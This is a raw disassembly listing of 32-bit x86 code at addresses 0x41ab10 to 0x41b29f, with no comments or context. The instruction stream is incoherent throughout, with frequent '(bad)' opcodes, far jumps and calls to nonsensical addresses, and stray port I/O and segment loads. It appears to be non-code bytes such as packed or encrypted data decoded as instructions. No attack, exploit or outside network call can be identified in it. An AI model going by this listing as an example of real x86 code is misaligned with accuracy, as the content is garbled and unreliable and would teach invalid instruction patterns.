  41ab10:	add    ch,BYTE PTR [ebp-0x698acae7]
  41ab16:	fisttp DWORD PTR [esi]
  41ab18:	dec    edi
  41ab19:	lds    ebp,FWORD PTR [ecx-0x75]
  41ab1c:	push   ss
  41ab1d:	xchg   ecx,eax
  41ab1e:	xor    BYTE PTR [ebp+ebp*2-0x30dbe740],cl
  41ab25:	or     esp,edi
  41ab27:	stc    
  41ab28:	sub    edi,ebp
  41ab2a:	and    BYTE PTR [eax+0x80c66cf],bl
  41ab30:	arpl   WORD PTR ds:0x477dad42,bx
  41ab36:	mov    WORD PTR [ecx-0x3],ss
  41ab39:	repz sbb al,0xe3
  41ab3c:	sbb    eax,edx
  41ab3e:	mov    cl,0xe8
  41ab40:	adc    al,0xe5
  41ab42:	inc    esp
  41ab43:	scas   al,BYTE PTR es:[edi]
  41ab44:	push   ds
  41ab45:	mov    eax,0xc7f66b25
  41ab4a:	pop    edx
  41ab4b:	mov    al,ds:0x429e9287
  41ab50:	mov    esp,0xdb9577c1
  41ab55:	cmp    BYTE PTR ds:0x55cca104,ch
  41ab5b:	(bad)  
  41ab5c:	shl    DWORD PTR ds:0x4d2d0868,cl
  41ab62:	dec    ebx
  41ab63:	mov    edx,0x69a60fdc
  41ab68:	jmp    FWORD PTR [eax+edi*2+0x27cb3081]
  41ab6f:	out    dx,al
  41ab70:	sahf   
  41ab71:	xor    BYTE PTR [ebp-0x35cf2b38],0x71
  41ab78:	xchg   DWORD PTR [esi-0x3ef8bbf4],edi
  41ab7e:	mov    bh,0xaa
  41ab80:	pop    esp
  41ab81:	sahf   
  41ab82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab83:	rcl    DWORD PTR [edi-0x3b1c56a0],0xa1
  41ab8a:	sbb    eax,0x40c9c2c7
  41ab8f:	out    dx,al
  41ab90:	sbb    DWORD PTR [ebx-0x35],ebx
  41ab93:	inc    edi
  41ab94:	pop    edx
  41ab95:	mov    dl,0x3c
  41ab97:	xchg   edx,eax
  41ab98:	pop    edx
  41ab99:	into   
  41ab9a:	(bad)  
  41ab9b:	jecxz  0x41ab49
  41ab9d:	adc    eax,0xc693d730
  41aba2:	nop
  41aba3:	int3   
  41aba4:	pop    edi
  41aba5:	cmp    dh,bl
  41aba7:	sbb    eax,0xf842c569
  41abac:	dec    edx
  41abad:	std    
  41abae:	xchg   ebx,eax
  41abaf:	iret   
  41abb0:	cmc    
  41abb1:	gs dec edi
  41abb3:	aam    0xe6
  41abb5:	cmc    
  41abb6:	sub    eax,DWORD PTR [ecx+0x10]
  41abb9:	sar    ebp,0x5b
  41abbc:	push   esi
  41abbd:	cs js  0x41ab7f
  41abc0:	cmp    eax,0xcfca3db3
  41abc5:	push   es
  41abc6:	sahf   
  41abc7:	in     eax,0xc2
  41abc9:	mov    ds:0x5d5f6793,eax
  41abce:	fucom  st(5)
  41abd0:	pushf  
  41abd1:	in     eax,dx
  41abd2:	int    0x4f
  41abd4:	mov    eax,0xa16e749c
  41abd9:	icebp  
  41abda:	mov    ebp,0xd01b6b06
  41abdf:	jbe    0x41abdd
  41abe1:	sti    
  41abe2:	add    ch,dl
  41abe4:	mov    BYTE PTR [edi],dl
  41abe6:	int3   
  41abe7:	fsubr  st,st(7)
  41abe9:	lea    edx,[esi+ecx*8+0x629f6420]
  41abf0:	pop    es
  41abf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf2:	jno    0x41ac0b
  41abf4:	mov    ecx,0x7d74692d
  41abf9:	std    
  41abfa:	pop    ss
  41abfb:	aas    
  41abfc:	adc    eax,0xe79591fe
  41ac01:	dec    ebp
  41ac02:	cmc    
  41ac03:	mov    bh,0x7a
  41ac05:	(bad)  [ecx]
  41ac07:	stos   DWORD PTR es:[edi],eax
  41ac08:	inc    eax
  41ac09:	fsub   QWORD PTR [eax+0x34abf05e]
  41ac0f:	mov    edx,0x37945c11
  41ac14:	fidiv  WORD PTR [edi+0x6b302a7d]
  41ac1a:	jbe    0x41abca
  41ac1c:	dec    ebp
  41ac1d:	push   ss
  41ac1e:	add    DWORD PTR [ecx-0x70babeac],esp
  41ac24:	jecxz  0x41ac81
  41ac26:	and    al,0x76
  41ac28:	push   0x9678b45d
  41ac2d:	add    al,0xf7
  41ac2f:	ds jno 0x41abc9
  41ac32:	mov    dl,0x10
  41ac34:	jne    0x41abb9
  41ac36:	mov    ds:0xc0bc2164,eax
  41ac3b:	lds    ebx,FWORD PTR [edx+0x4a]
  41ac3e:	out    dx,eax
  41ac3f:	inc    ebx
  41ac40:	cs repnz leave 
  41ac43:	push   esp
  41ac44:	push   cs
  41ac45:	push   ss
  41ac46:	(bad)  
  41ac48:	js     0x41ac3a
  41ac4a:	inc    esp
  41ac4b:	outs   dx,BYTE PTR ds:[esi]
  41ac4c:	adc    ch,BYTE PTR [ebp+0x21]
  41ac4f:	shl    DWORD PTR es:[ebp+0x2f0b2029],cl
  41ac56:	(bad)  
  41ac57:	outs   dx,DWORD PTR ds:[esi]
  41ac58:	jle    0x41ac10
  41ac5a:	loope  0x41abdd
  41ac5c:	jecxz  0x41ac27
  41ac5e:	fwait
  41ac5f:	xchg   edi,eax
  41ac60:	jge    0x41abf2
  41ac62:	shl    dl,cl
  41ac64:	lock lods eax,DWORD PTR ds:[esi]
  41ac66:	jmp    0xb8597702
  41ac6b:	pop    esp
  41ac6c:	inc    edx
  41ac6d:	(bad)  
  41ac6f:	push   edi
  41ac70:	rcl    DWORD PTR [ebx+0x6a],0xf3
  41ac74:	fsubr  st(5),st
  41ac76:	inc    esi
  41ac77:	fist   WORD PTR [ebx-0x1c]
  41ac7a:	scas   eax,DWORD PTR es:[edi]
  41ac7b:	sub    eax,0x57a0520a
  41ac80:	out    0xa3,eax
  41ac82:	sub    al,0xe2
  41ac84:	jle    0x41ac70
  41ac86:	mov    edi,0x6828b71d
  41ac8b:	and    al,0xf8
  41ac8d:	pushf  
  41ac8e:	xor    eax,0xa28331fa
  41ac93:	dec    esi
  41ac94:	mov    bl,0xe2
  41ac96:	pushf  
  41ac97:	cwde   
  41ac98:	mov    esp,0xd1ed41d6
  41ac9d:	push   ds
  41ac9e:	xor    cl,BYTE PTR [edi+0x6]
  41aca1:	or     bh,BYTE PTR fs:[ebx-0x4]
  41aca5:	inc    edi
  41aca6:	ins    BYTE PTR es:[edi],dx
  41aca7:	outs   dx,DWORD PTR ds:[esi]
  41aca8:	adc    eax,edi
  41acaa:	push   eax
  41acab:	out    0x68,al
  41acad:	or     cl,BYTE PTR [ebx+ebx*1]
  41acb0:	ret    0xf7b2
  41acb3:	jmp    0xc3a70a03
  41acb8:	cwde   
  41acb9:	cdq    
  41acba:	push   ss
  41acbb:	sub    DWORD PTR [edx],esp
  41acbd:	mov    eax,0x7aa5872c
  41acc2:	xlat   BYTE PTR ds:[ebx]
  41acc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acc4:	ss pop esp
  41acc6:	add    eax,0xbfde7eeb
  41accb:	sub    BYTE PTR [eax+0x63],dh
  41acce:	stc    
  41accf:	sub    BYTE PTR [edi-0xc53da71],ah
  41acd5:	aaa    
  41acd6:	arpl   WORD PTR [ebx+0x67],si
  41acd9:	jp     0x41acd4
  41acdb:	mov    eax,ds:0x54a6279a
  41ace0:	daa    
  41ace1:	mov    dh,0xac
  41ace3:	(bad)  
  41ace4:	dec    esp
  41ace5:	mov    ebp,0x7a8be914
  41acea:	jmp    0x8e6a:0x8aa1533d
  41acf1:	and    al,0x7a
  41acf3:	pop    ecx
  41acf4:	jo     0x41ac8e
  41acf6:	pop    edi
  41acf7:	push   0x8f4eb90
  41acfc:	int    0xdd
  41acfe:	push   ebp
  41acff:	sbb    eax,0xdddf5752
  41ad04:	jecxz  0x41ad37
  41ad06:	and    BYTE PTR [edx+0x2f4885ea],cl
  41ad0c:	dec    edi
  41ad0d:	inc    esi
  41ad0e:	out    0xe1,eax
  41ad10:	adc    al,0x55
  41ad12:	push   ecx
  41ad13:	cmp    BYTE PTR [edx+ebx*8+0x66f42f9a],al
  41ad1a:	pop    ebx
  41ad1b:	out    0x5d,eax
  41ad1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad1e:	mov    al,ds:0x1b1f38d9
  41ad23:	(bad)  
  41ad24:	fwait
  41ad25:	adc    eax,0x693d491e
  41ad2a:	dec    ecx
  41ad2b:	out    0xe9,eax
  41ad2d:	pop    es
  41ad2e:	sar    BYTE PTR [ecx-0xb1705d8],0xb8
  41ad35:	or     eax,0xd27a16a1
  41ad3a:	int    0xfc
  41ad3c:	mov    ebx,0x39ec4e85
  41ad41:	push   ss
  41ad42:	aad    0xc4
  41ad44:	outs   dx,DWORD PTR ds:[esi]
  41ad45:	shl    DWORD PTR [ebp-0x2a],0xf1
  41ad49:	das    
  41ad4a:	nop
  41ad4b:	aas    
  41ad4c:	addr16 dec ebp
  41ad4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad4f:	pop    es
  41ad50:	jbe    0x41ad2f
  41ad52:	(bad)  
  41ad53:	out    dx,al
  41ad54:	push   ecx
  41ad55:	jmp    0x3f3e9903
  41ad5a:	jns    0x41adcd
  41ad5c:	sbb    ebx,esi
  41ad5e:	pop    esp
  41ad5f:	or     eax,DWORD PTR fs:[edx]
  41ad62:	jmp    0x78b1:0xab9068b5
  41ad69:	lock add ebx,DWORD PTR [edi-0x120050a3]
  41ad70:	(bad)  
  41ad71:	in     al,dx
  41ad72:	xchg   edx,eax
  41ad73:	and    al,0xa5
  41ad75:	clc    
  41ad76:	xchg   edx,eax
  41ad77:	or     cl,al
  41ad79:	mov    bl,0xb1
  41ad7b:	or     eax,0xd4154384
  41ad80:	rcr    BYTE PTR [edi-0x5f8521e0],cl
  41ad86:	scas   al,BYTE PTR es:[edi]
  41ad87:	imul   DWORD PTR [eax+0x991b06]
  41ad8d:	test   al,0xf1
  41ad8f:	jp     0x41adc7
  41ad91:	dec    ecx
  41ad92:	pop    edi
  41ad93:	xor    DWORD PTR gs:[ecx-0x18c6da1b],ebx
  41ad9a:	push   0x38
  41ad9c:	sub    ah,BYTE PTR [ebx+0x5c]
  41ad9f:	icebp  
  41ada0:	dec    ebp
  41ada1:	fwait
  41ada2:	daa    
  41ada3:	in     al,0x20
  41ada5:	jecxz  0x41ad5e
  41ada7:	push   es
  41ada8:	sub    esi,DWORD PTR [eax+ebp*4]
  41adab:	adc    eax,0x6a86d49
  41adb0:	adc    ch,0x1
  41adb3:	cmp    DWORD PTR [ecx+edx*8+0x13],eax
  41adb7:	je     0x41adf0
  41adb9:	fdiv   QWORD PTR [edx+0x0]
  41adbc:	jmp    0x67f98102
  41adc1:	cmp    eax,DWORD PTR [edi+0x36283272]
  41adc7:	jle    0x41adba
  41adc9:	cmp    DWORD PTR [edi-0x6a],edx
  41adcc:	pop    edi
  41adcd:	dec    esp
  41adce:	lds    edi,FWORD PTR [si]
  41add1:	stos   BYTE PTR es:[edi],al
  41add2:	enter  0x533d,0x9c
  41add6:	jp     0x41ae32
  41add8:	ror    esi,0x9d
  41addb:	mov    ds:0xd3c9b866,eax
  41ade0:	rcl    DWORD PTR [esi],0x77
  41ade3:	test   eax,0xebce48d4
  41ade8:	sbb    eax,0x11e4e7f3
  41aded:	mov    ds:0x3185aacb,eax
  41adf2:	cli    
  41adf3:	stos   BYTE PTR es:[edi],al
  41adf4:	sub    bl,BYTE PTR [eax]
  41adf6:	shl    BYTE PTR [edi+0x11],1
  41adf9:	cld    
  41adfa:	add    BYTE PTR [eax+0x46],dl
  41adfd:	es cs and BYTE PTR cs:[ebx-0x655cc667],dl
  41ae06:	das    
  41ae07:	and    al,0xab
  41ae09:	test   al,0xaa
  41ae0b:	das    
  41ae0c:	adc    dl,al
  41ae0e:	inc    ebp
  41ae0f:	or     esi,0x7bc2ab90
  41ae15:	xor    al,0x6
  41ae17:	das    
  41ae18:	push   esi
  41ae19:	inc    eax
  41ae1a:	loopne 0x41adb1
  41ae1c:	jbe    0x41addb
  41ae1e:	adc    ecx,ebp
  41ae20:	dec    ecx
  41ae21:	leave  
  41ae22:	mov    ecx,0x79d326ab
  41ae27:	imul   ebp,DWORD PTR [ebx-0x236ca0ee],0xffffffe9
  41ae2e:	pop    eax
  41ae2f:	lds    ecx,FWORD PTR [ebx]
  41ae31:	jmp    0x216a:0xbadf03fc
  41ae38:	(bad)  
  41ae39:	xor    bh,BYTE PTR [edx-0x45]
  41ae3c:	adc    bl,0x2b
  41ae3f:	and    al,0x5a
  41ae41:	arpl   WORD PTR [ebp-0x4f67dc7a],dx
  41ae47:	mul    DWORD PTR [esi+0x61]
  41ae4a:	xchg   DWORD PTR [ecx-0x5367219f],ebp
  41ae50:	int    0x2f
  41ae52:	adc    DWORD PTR [edx-0x1056134b],0x56063806
  41ae5c:	pushf  
  41ae5d:	jmp    0x41ade2
  41ae5f:	icebp  
  41ae60:	push   es
  41ae61:	push   edx
  41ae62:	xchg   BYTE PTR [ebp+edi*8-0x9],dl
  41ae66:	mov    esp,0x287117e7
  41ae6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae6c:	ja     0x41aeae
  41ae6e:	pop    ecx
  41ae6f:	icebp  
  41ae70:	gs (bad) 
  41ae72:	mov    esp,0x98330d2e
  41ae77:	cmp    al,0xfd
  41ae79:	div    bl
  41ae7b:	mov    cl,0x3a
  41ae7d:	push   cs
  41ae7e:	or     al,cl
  41ae80:	loopne 0x41ae91
  41ae82:	mov    ch,0xa6
  41ae84:	jg     0x41ae85
  41ae86:	fxch   st(4)
  41ae88:	popf   
  41ae89:	xchg   DWORD PTR [ecx-0x171124e4],ecx
  41ae8f:	cmp    eax,0x78cdb507
  41ae94:	or     esi,esp
  41ae96:	fs das 
  41ae98:	adc    esp,DWORD PTR [esi+edx*1]
  41ae9b:	fnsave ds:[edx]
  41ae9e:	cdq    
  41ae9f:	(bad)  
  41aea0:	jmp    0x35aea2cc
  41aea5:	rol    DWORD PTR [ebp+0x217f9a87],1
  41aeab:	loope  0x41ae5f
  41aead:	int3   
  41aeae:	shr    BYTE PTR [edx+0x7d],cl
  41aeb1:	pop    ebp
  41aeb2:	cmp    eax,0x2e7be482
  41aeb7:	xor    ah,BYTE PTR [edi+0x7]
  41aeba:	sbb    al,0xb1
  41aebc:	xor    ebx,DWORD PTR [bp+si+0x7b]
  41aec0:	clc    
  41aec1:	sub    al,0x20
  41aec3:	ror    BYTE PTR [ebp-0x4],1
  41aec6:	cmp    ebx,DWORD PTR ds:0x1e04749a
  41aecc:	clc    
  41aecd:	mov    ah,0x79
  41aecf:	inc    edi
  41aed0:	je     0x41ae5d
  41aed2:	or     ah,BYTE PTR [edi+0x7]
  41aed5:	mov    ah,0xaa
  41aed7:	sub    BYTE PTR [eax+0x3f],dl
  41aeda:	jne    0x41aec1
  41aedc:	xchg   edx,eax
  41aedd:	push   ebx
  41aede:	and    BYTE PTR [esi+0x3fafcf39],dh
  41aee4:	add    ch,BYTE PTR [eax+0x63]
  41aee7:	xor    BYTE PTR [ebp+0x4],0xec
  41aeeb:	(bad)  
  41aeec:	ins    DWORD PTR es:[edi],dx
  41aeed:	or     BYTE PTR [edi-0x5f],dl
  41aef0:	cmp    al,0x6b
  41aef2:	repnz or DWORD PTR [esi-0x5300e9da],ebp
  41aef9:	xchg   ebp,eax
  41aefa:	sub    dh,dh
  41aefc:	out    0x3c,eax
  41aefe:	sbb    al,0x66
  41af00:	(bad)
  41af03:	shr    BYTE PTR [esi-0x77ddad89],1
  41af09:	lods   al,BYTE PTR ds:[esi]
  41af0a:	out    0xd5,eax
  41af0c:	jecxz  0x41aef7
  41af0e:	sub    DWORD PTR [ebx+0x6c],ebp
  41af11:	clc    
  41af12:	in     eax,0x91
  41af14:	bound  esp,QWORD PTR [edi]
  41af16:	mov    al,ds:0xb6ad431c
  41af1b:	xor    BYTE PTR [edi+0x2e80ea9b],bl
  41af21:	es xor al,0xdd
  41af24:	ret    
  41af25:	(bad)  
  41af26:	(bad)  
  41af27:	pop    esp
  41af28:	mov    dh,0x62
  41af2a:	jno    0x41af2d
  41af2c:	xlat   BYTE PTR ds:[ebx]
  41af2d:	fst    st(2)
  41af2f:	mul    BYTE PTR [ecx-0x60]
  41af32:	retf   0xa93d
  41af35:	aad    0x14
  41af37:	sub    edi,esp
  41af39:	mov    cl,0x29
  41af3b:	ret    
  41af3c:	mov    edx,0xe8e43d50
  41af41:	ss adc al,0xee
  41af44:	xchg   esp,eax
  41af45:	jecxz  0x41af07
  41af47:	scas   eax,DWORD PTR es:[edi]
  41af48:	pusha  
  41af49:	mov    dl,0x4a
  41af4b:	xchg   ebx,eax
  41af4c:	lods   eax,DWORD PTR ds:[esi]
  41af4d:	dec    ecx
  41af4e:	pop    es
  41af4f:	or     DWORD PTR [ecx+0x49],ebp
  41af52:	inc    edx
  41af53:	rcr    BYTE PTR [eax+0x6f2dc028],cl
  41af59:	xchg   esp,eax
  41af5a:	xor    esi,DWORD PTR ds:0x45ee373a
  41af60:	sbb    dl,BYTE PTR [edx+0x750ad1bb]
  41af66:	test   BYTE PTR [edx+0x7a44cf4a],ah
  41af6c:	imul   esp,eax,0xffffffd3
  41af6f:	cli    
  41af70:	gs scas eax,DWORD PTR es:[edi]
  41af72:	or     ah,cl
  41af74:	and    eax,0x68ca7f09
  41af79:	cs jo  0x41af17
  41af7c:	jnp    0x41aff2
  41af7e:	loopne 0x41af7b
  41af80:	push   esi
  41af81:	out    0x18,al
  41af83:	jmp    0xdcbced8
  41af88:	xor    ch,BYTE PTR [esi+0x1f]
  41af8b:	sub    eax,0x49915fad
  41af90:	faddp  st(5),st
  41af92:	in     al,dx
  41af93:	mov    ah,0x46
  41af95:	subps  xmm7,XMMWORD PTR [edi-0x30]
  41af99:	ror    BYTE PTR [esi],cl
  41af9b:	xchg   ecx,eax
  41af9c:	jl     0x41af33
  41af9e:	imul   edi,DWORD PTR [esi-0x63],0xffffff89
  41afa2:	pushw  cs
  41afa4:	mov    ch,BYTE PTR [ebx-0x48]
  41afa7:	fist   DWORD PTR [edx-0x40ae320]
  41afad:	mov    al,ds:0x5338b587
  41afb2:	scas   al,BYTE PTR es:[edi]
  41afb3:	retf   
  41afb4:	mov    dl,0x19
  41afb6:	cs push ebx
  41afb8:	leave  
  41afb9:	xchg   DWORD PTR [ecx+esi*4-0x3a],edx
  41afbd:	mov    eax,0x708052d0
  41afc2:	xor    ebx,DWORD PTR [ebx]
  41afc4:	rol    BYTE PTR [esi],cl
  41afc6:	push   ebp
  41afc7:	sbb    DWORD PTR [ecx+0xc],0x56
  41afcb:	js     0x41afea
  41afcd:	idiv   ch
  41afcf:	test   DWORD PTR [esi+edi*2-0x1f],ecx
  41afd3:	in     eax,dx
  41afd4:	fstp   TBYTE PTR [esi-0x7de1c61d]
  41afda:	iret   
  41afdb:	mov    dh,0x24
  41afdd:	cmp    al,0x82
  41afdf:	mov    bl,0xf4
  41afe1:	xchg   ecx,eax
  41afe2:	jne    0x41af71
  41afe4:	sahf   
  41afe5:	cmp    DWORD PTR [eax+edi*4],edi
  41afe8:	mov    fs,esi
  41afea:	lods   eax,DWORD PTR ds:[esi]
  41afeb:	sub    ecx,ebx
  41afed:	xchg   edx,eax
  41afee:	push   eax
  41afef:	pop    edi
  41aff0:	mov    eax,ds:0xd338b4db
  41aff5:	ret    
  41aff6:	call   0xb53b6f7b
  41affb:	loope  0x41afd3
  41affd:	inc    esp
  41affe:	pop    esi
  41afff:	es jnp 0x41b047
  41b002:	adc    DWORD PTR [edi],0x80c6ee2c
  41b008:	test   eax,0xbd5ad945
  41b00d:	stos   DWORD PTR es:[edi],eax
  41b00e:	out    0xf7,eax
  41b010:	cmc    
  41b011:	stc    
  41b012:	pop    ebp
  41b013:	in     eax,dx
  41b014:	xor    al,BYTE PTR [edi+0x65]
  41b017:	aaa    
  41b018:	mov    ah,0x40
  41b01a:	mov    DWORD PTR [ebp-0x476c201d],ecx
  41b020:	(bad)  [edx]
  41b022:	push   esp
  41b023:	and    edx,edx
  41b025:	stos   DWORD PTR es:[edi],eax
  41b026:	fdiv   st(3),st
  41b028:	add    BYTE PTR [edi],0x65
  41b02b:	arpl   si,bp
  41b02d:	repz mov ch,0xdd
  41b030:	mov    DWORD PTR [eax-0x4a],ecx
  41b033:	xor    ebp,eax
  41b035:	pop    edx
  41b036:	push   esi
  41b037:	add    eax,0x2ec19e70
  41b03c:	jns    0x41b071
  41b03e:	lock push esi
  41b040:	sub    al,BYTE PTR [ecx-0xc]
  41b043:	add    eax,0x7f00cef3
  41b048:	(bad)  
  41b04a:	dec    esp
  41b04b:	xchg   DWORD PTR [edi],esi
  41b04d:	add    DWORD PTR [ebx],0x2eac8bb4
  41b053:	imul   ebp,DWORD PTR [esi-0x74370928],0xffffff9b
  41b05a:	retf   0x6858
  41b05d:	into   
  41b05e:	hlt    
  41b05f:	bound  ebp,QWORD PTR [ebx-0x2]
  41b062:	mov    esp,0x93023d3a
  41b067:	call   0xa12:0xbc284f1d
  41b06e:	popf   
  41b06f:	enter  0xfd3b,0xaa
  41b073:	retf   0xb60f
  41b076:	cmp    cl,dl
  41b078:	or     BYTE PTR [ebp-0xe],dl
  41b07b:	call   0x548f372a
  41b080:	inc    eax
  41b081:	mov    ecx,0x9802eb90
  41b086:	aaa    
  41b087:	fwait
  41b088:	push   esp
  41b089:	ret    
  41b08a:	inc    esi
  41b08b:	test   eax,0xeb5cf72c
  41b090:	je     0x41b060
  41b092:	lods   eax,DWORD PTR ds:[esi]
  41b093:	adc    BYTE PTR [ebx-0x63fdde87],ch
  41b099:	push   edi
  41b09a:	dec    BYTE PTR [eax+0xed726a5]
  41b0a0:	xchg   esi,eax
  41b0a1:	xor    cl,cl
  41b0a3:	cdq    
  41b0a4:	test   al,0xcd
  41b0a6:	push   esp
  41b0a7:	shl    bh,0xbc
  41b0aa:	jbe    0x41b12a
  41b0ac:	mov    al,0x49
  41b0ae:	es xchg ebp,eax
  41b0b0:	mov    WORD PTR [eax-0x10ff6124],?
  41b0b6:	dec    esp
  41b0b7:	repz scas eax,DWORD PTR es:[edi]
  41b0b9:	and    eax,0xdd668448
  41b0be:	aam    0x9a
  41b0c0:	ins    BYTE PTR es:[edi],dx
  41b0c1:	test   BYTE PTR [esi-0x6b0f39cc],cl
  41b0c7:	jmp    0x28b62345
  41b0cc:	out    0xca,eax
  41b0ce:	(bad)  
  41b0cf:	in     eax,0x86
  41b0d1:	adc    eax,DWORD PTR [ebp+0xa]
  41b0d4:	(bad)  
  41b0d6:	and    al,0x43
  41b0d8:	cmp    al,0x75
  41b0da:	in     eax,dx
  41b0db:	out    dx,eax
  41b0dc:	sub    DWORD PTR [eax-0x6d],eax
  41b0df:	xor    eax,0xe7c62e56
  41b0e4:	in     al,dx
  41b0e5:	adc    al,0x40
  41b0e7:	or     eax,0x1f5ade06
  41b0ec:	jns    0x41b0ed
  41b0ee:	retf   0xd32e
  41b0f1:	xchg   edx,eax
  41b0f2:	fld    QWORD PTR [ebx+0x638b5660]
  41b0f8:	mov    eax,0xd4b9c0c4
  41b0fd:	pusha  
  41b0fe:	fldenv [ebx]
  41b100:	xor    al,0xdb
  41b102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b103:	xchg   BYTE PTR [ebx-0x70],dl
  41b106:	and    BYTE PTR [ebp+0x11315cde],bh
  41b10c:	sub    al,0x3c
  41b10e:	mov    ds:0xeeb6d145,al
  41b113:	call   FWORD PTR [edx+0x6f]
  41b116:	add    DWORD PTR [eax+0x65],ebx
  41b119:	push   esi
  41b11a:	inc    esp
  41b11b:	mov    esi,0x8f27e3b9
  41b120:	sub    DWORD PTR [ebp-0x1a],ecx
  41b123:	xor    eax,ebp
  41b125:	ds xor al,0xd7
  41b128:	pop    esi
  41b129:	push   ebp
  41b12a:	popa   
  41b12b:	popa   
  41b12c:	out    dx,al
  41b12d:	out    dx,eax
  41b12e:	call   0xbcd3:0x2c7e0e72
  41b135:	js     0x41b0ff
  41b137:	icebp  
  41b138:	out    dx,al
  41b139:	sub    bl,BYTE PTR [edi+edi*1+0x25]
  41b13d:	sbb    eax,0xad72eeeb
  41b142:	or     eax,0x257ad948
  41b147:	jmp    0x41b0e2
  41b149:	jne    0x41b104
  41b14b:	mov    ch,0x4e
  41b14d:	das    
  41b14e:	out    0x95,al
  41b150:	retf   0x82aa
  41b153:	cld    
  41b154:	mov    ds:0x8dbaf7d1,al
  41b159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b15a:	jb     0x41b125
  41b15c:	loop   0x41b175
  41b15e:	sub    edi,DWORD PTR [ecx-0x4c]
  41b161:	lock loope 0x41b0ef
  41b164:	cli    
  41b165:	push   ecx
  41b166:	adc    bh,BYTE PTR [eax]
  41b168:	cs mov esp,0xb9ef81d7
  41b16e:	mov    ah,0xe
  41b170:	add    eax,DWORD PTR [eax-0x49]
  41b173:	add    ah,bh
  41b175:	ins    BYTE PTR es:[edi],dx
  41b176:	addr16 add eax,0x771a770b
  41b17c:	add    al,0x65
  41b17e:	dec    ebx
  41b17f:	push   edi
  41b180:	xor    eax,DWORD PTR [ebp+0x7c654a5e]
  41b186:	mov    WORD PTR [ebx-0x74],ss
  41b189:	mov    edi,0xe25247b1
  41b18e:	mov    esi,0x5b01acdb
  41b193:	pop    edx
  41b194:	nop
  41b195:	xor    ah,bh
  41b197:	dec    ecx
  41b198:	cmp    ecx,DWORD PTR ds:0x1327aa6f
  41b19e:	inc    ebp
  41b19f:	ss sbb bh,cl
  41b1a2:	(bad)  
  41b1a3:	mov    ds:0xf25b1e0e,eax
  41b1a8:	jnp    0x41b13a
  41b1aa:	xor    DWORD PTR [ebx-0x5ea19a38],0x16
  41b1b1:	call   0x7834:0x26e54e04
  41b1b8:	je     0x41b1dd
  41b1ba:	ret    0x1ac
  41b1bd:	int3   
  41b1be:	or     ch,BYTE PTR [edi-0x197d55fd]
  41b1c4:	hlt    
  41b1c5:	fimul  DWORD PTR [esp+esi*8]
  41b1c8:	jne    0x41b176
  41b1ca:	sub    esp,ecx
  41b1cc:	sbb    ah,BYTE PTR [edi+0x30d88dc6]
  41b1d2:	sbb    dl,BYTE PTR [eax-0x4]
  41b1d5:	xchg   cl,dl
  41b1d7:	in     eax,0x4e
  41b1d9:	stc    
  41b1da:	popf   
  41b1db:	mov    ebp,0xd2957f51
  41b1e0:	rcl    esp,0x20
  41b1e3:	xchg   edx,eax
  41b1e4:	cmp    esp,edx
  41b1e6:	mov    ebp,ebx
  41b1e8:	pop    edi
  41b1e9:	and    al,0x51
  41b1eb:	adc    esi,DWORD PTR [edi+ebx*2]
  41b1ee:	aam    0xca
  41b1f0:	jmp    0xa58068d5
  41b1f5:	mov    ch,0xf0
  41b1f7:	jnp    0x41b208
  41b1f9:	push   esp
  41b1fa:	test   BYTE PTR [eax+0x1a],al
  41b1fd:	cmp    al,0x89
  41b1ff:	fsub   st,st(1)
  41b201:	js     0x41b214
  41b203:	mov    dl,0xea
  41b205:	or     eax,0xa6016688
  41b20a:	enter  0x6666,0xa6
  41b20e:	cmc    
  41b20f:	fisttp QWORD PTR [edx+edx*8-0x1d]
  41b213:	pop    esi
  41b214:	imul   eax,DWORD PTR [ebp-0x3b],0x5a
  41b218:	mov    BYTE PTR [eax+eax*4-0x3cc7de3],al
  41b21f:	push   esi
  41b220:	dec    eax
  41b221:	mov    eax,esp
  41b223:	dec    esp
  41b224:	loopne 0x41b270
  41b226:	adc    eax,0x19464421
  41b22b:	lds    edi,FWORD PTR [edi-0x16944711]
  41b231:	xchg   BYTE PTR [ebp+0x3c],bl
  41b234:	stos   DWORD PTR es:[edi],eax
  41b235:	sub    dl,BYTE PTR [esi]
  41b237:	pop    edi
  41b238:	mov    esi,0x861faa3e
  41b23d:	aaa    
  41b23e:	ret    
  41b23f:	arpl   WORD PTR ds:0xde7985d4,si
  41b245:	stos   DWORD PTR es:[edi],eax
  41b246:	mov    cl,0x3f
  41b248:	int    0xa2
  41b24a:	pop    eax
  41b24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b24c:	pop    ss
  41b24d:	add    DWORD PTR [ecx+0x6fe357d0],ebx
  41b253:	sbb    BYTE PTR [edi+0x60],0x51
  41b257:	hlt    
  41b258:	push   ebp
  41b259:	outs   dx,DWORD PTR ds:[esi]
  41b25a:	push   ecx
  41b25b:	not    DWORD PTR [ecx-0x16]
  41b25e:	adc    BYTE PTR [esi+0x39],bl
  41b261:	push   ecx
  41b262:	mov    ch,0xe0
  41b264:	mov    WORD PTR [ebp+0x4d],?
  41b267:	pop    es
  41b268:	xlat   BYTE PTR ds:[ebx]
  41b269:	xchg   esi,eax
  41b26a:	cmp    edi,DWORD PTR [edx]
  41b26c:	test   BYTE PTR [ecx-0x6c35d688],al
  41b272:	mov    edi,DWORD PTR [ecx+ebp*8-0x58fdd26f]
  41b279:	jbe    0x41b26a
  41b27b:	(bad)  
  41b27c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b27d:	push   es
  41b27e:	iret   
  41b27f:	lock lods al,BYTE PTR ds:[esi]
  41b281:	iret   
  41b282:	hlt    
  41b283:	std    
  41b284:	fxch   st(4)
  41b286:	mov    esp,ebp
  41b288:	mov    ah,0x68
  41b28a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b28c:	xchg   ebx,eax
  41b28d:	inc    edi
  41b28e:	aaa    
  41b28f:	adc    edx,DWORD PTR [edi+0x7dfd207d]
  41b295:	outs   dx,DWORD PTR ds:[esi]
  41b296:	adc    di,WORD PTR [ebx+0x14ebbe08]
  41b29d:	je     0x41b237
  41b29f:	arpl   WORD PTR ds:0x8b2798d9,cx
